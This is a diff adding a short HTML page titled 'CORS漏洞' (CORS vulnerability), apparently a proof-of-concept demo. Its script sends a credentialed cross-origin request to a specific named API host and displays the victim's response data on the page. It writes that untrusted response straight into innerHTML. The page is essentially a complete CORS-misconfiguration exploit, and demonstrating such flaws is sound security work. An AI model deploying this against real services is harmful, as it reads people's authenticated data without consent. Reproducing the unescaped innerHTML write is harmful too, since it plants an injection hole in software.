@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <title>CORS漏洞</title>
+</head>
+<body>
+<div id="text"></div>
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+<script>
+    $.ajax({url:"http://local-api.gaeamobile.net:8888/cors",
+        type: 'get',
+        xhrFields:{withCredentials: true}, // 发送凭据
+        success:function(req){
+            console.log(req)
+            document.querySelector('#text').innerHTML = req.retMsg
+        }});
+</script>
+</body>
+</html>
